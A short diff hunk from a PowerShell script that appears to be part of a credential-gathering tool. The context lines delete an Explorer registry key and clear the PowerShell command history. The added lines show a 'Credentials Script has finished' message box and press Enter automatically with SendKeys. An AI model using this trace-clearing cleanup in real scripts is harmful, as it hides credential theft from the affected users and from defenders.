@@ -170,3 +170,10 @@ reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\
 
 # Clear the PowerShell command history
 Clear-History
+
+
+# Display a message box indicating completion
+Add-Type -AssemblyName PresentationFramework
+[System.Windows.MessageBox]::Show('Credentials Script has finished, Next is File Tree', 'Notification')
+Start-Sleep -Milliseconds 2000  # Wait for the input
+[System.Windows.Forms.SendKeys]::SendWait("{ENTER}")  # Press Enter to save
